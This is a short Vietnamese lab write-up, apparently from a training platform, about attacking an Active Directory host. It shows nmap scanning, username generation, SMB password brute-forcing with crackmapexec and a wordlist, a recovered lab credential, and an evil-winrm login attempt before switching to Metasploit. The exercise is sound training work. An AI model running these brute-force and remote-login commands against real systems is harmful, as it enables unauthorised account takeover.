<h1>Attacking Active Directory & NTDS.dit</h1>\

![image](https://github.com/user-attachments/assets/bc6bf75a-a3d9-4c77-b9b9-df6477e162ba)

![image](https://github.com/user-attachments/assets/c7e4a226-47e7-4f4f-b9f7-0da54bd27250)

![image](https://github.com/user-attachments/assets/163f93be-44e4-42cb-a77f-76b110a5d254)

Như mọi mở đầu, chạy `nmap -sV 10.129.202.85` và thấy chưa biết nên khai thác gì:

![image](https://github.com/user-attachments/assets/a97ec0d5-4749-4db4-aff2-6961c6003d06)

Ở câu hỏi có mấy cái tên nên tôi tạo 1 vài usernane với tool [username anarchy](https://github.com/urbanadventurer/username-anarchy):

![image](https://github.com/user-attachments/assets/0ba7da15-81bd-4482-9f15-feac378718b2)

Dùng `crackmapexec smb 10.129.202.85 -u user.txt -p /usr/share/wordlists/fasttrack.txt` để mò username:pass :

![image](https://github.com/user-attachments/assets/1cca2717-f0c8-4aec-8827-cfa8bb2a6a43)

Sau 1 lúc thì có cjohnson:Welcome1212 :

![image](https://github.com/user-attachments/assets/539d30ca-105d-4194-9154-fec1ea88fa65)

Dùng lệnh `evil-winrm -i 10.129.202.85  -u 'cjohnson' -p 'Welcome1212''` kết nối vào thôi:

Không hiểu sao target bảo không đúng, chạy thử `crackmapexec smb 10.129.42.197 -u "cjohnson" -p "Welcome1212" --shares` cũng chả có gì, đi tìm trên forum thì thấy bảo dùng metasploit để chạy:

![image](https://github.com/user-attachments/assets/04304609-a2f0-4a99-90c1-a891d374ff6f)

![image](https://github.com/user-attachments/assets/b89c256b-f563-4f13-9f7f-62b88982d55d)


